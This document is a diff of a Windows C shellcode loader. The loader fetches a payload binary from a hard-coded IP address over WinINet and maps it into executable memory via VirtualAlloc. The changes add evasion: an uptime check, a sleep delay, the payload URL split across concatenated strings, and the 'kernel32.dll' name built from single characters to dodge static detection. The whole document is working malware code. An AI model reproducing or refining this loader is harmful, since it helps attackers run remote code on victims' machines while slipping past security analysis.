@@ -19,14 +19,23 @@ typedef LPVOID (WINAPI* vaex)(
 int main(){
 
     if(1==1){
-        const char *url = "<URL to shellcode>"; // Replace with your URL to payload
+
+        
         HINTERNET hInternet = NULL, hUrlFile = NULL;
         BYTE buffer[1024];
         DWORD bytesRead;
         BYTE *shellcode = NULL;
-         DWORD totalBytes = 0;
+        DWORD totalBytes = 0;
+        DWORD tickCount = GetTickCount();
+    
+if (tickCount > 60000) {
 
-    // Initialize WinINet
+          // Initialize WinINet
+        char url[100]; // Ensure this is large enough to hold the final string
+        strcpy(url, "http:/192.167.244");
+        strcat(url, ".255/");
+        strcat(url, "RACIAL_MANTLE.bin");// Replace with your URL to payload
+        printf("%s",url);
         hInternet = InternetOpen("WinINetExample", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
           if (!hInternet) {
                printf("InternetOpen failed. Error: %lu\n", GetLastError());
@@ -57,11 +66,7 @@ int main(){
     InternetCloseHandle(hInternet);
         char c[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
          HMODULE hKernel32 = LoadLibraryA(c);
-         DWORD tickCount = GetTickCount();
-         HANDLE thandle=NULL;
-         CONTEXT ctx;
          Sleep(5000);
-        if (tickCount > 60000) {
             int j= 0;
             vaex alloc =(vaex)GetProcAddress(hKernel32,"VirtualAlloc");
             LPVOID alloc_mem = alloc(NULL, totalBytes, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
